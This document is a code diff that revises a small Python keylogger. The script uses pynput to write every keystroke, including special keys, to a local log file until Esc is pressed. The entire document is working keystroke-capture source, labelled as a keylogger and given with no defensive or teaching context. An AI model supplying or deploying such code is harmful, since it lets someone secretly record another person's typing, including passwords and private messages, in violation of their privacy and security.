@@ -1,32 +1,30 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-# Function to record keystrokes and save them to a file
+# File to save the logged keys
+LOG_FILE = "key_log.txt"
+
 def on_press(key):
     try:
-        # Convert key to printable character (e.g., 'a', 'b', 'Enter')
-        key_string = key.char
-    except AttributeError:
-        # Handle special keys (e.g., 'Backspace', 'Enter')
-        if key == Key.space:
-            key_string = ' '
-        elif key == Key.enter:
-            key_string = '\n'
-        elif key == Key.backspace:
-            key_string = '<Backspace>'
-        else:
-            key_string = str(key)
-    
-    # Write the keystroke to the file
-    with open('keylogger_log.txt', 'a') as f:
-        f.write(key_string)
+        # Log the key that was pressed
+        with open(LOG_FILE, "a") as file:
+            if hasattr(key, 'char') and key.char is not None:
+                file.write(key.char)
+            else:
+                # For special keys like space, enter, etc.
+                file.write(f'[{key}]')
+    except Exception as e:
+        print(f"Error: {e}")
 
-# Function to stop the keylogger when a key is released
 def on_release(key):
+    # Stop the listener when 'esc' key is released
     if key == Key.esc:
-        # Stop the listener when Escape key is pressed
         return False
 
-# Start listening for keystrokes
+# Setting up the keylogger
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
+
+
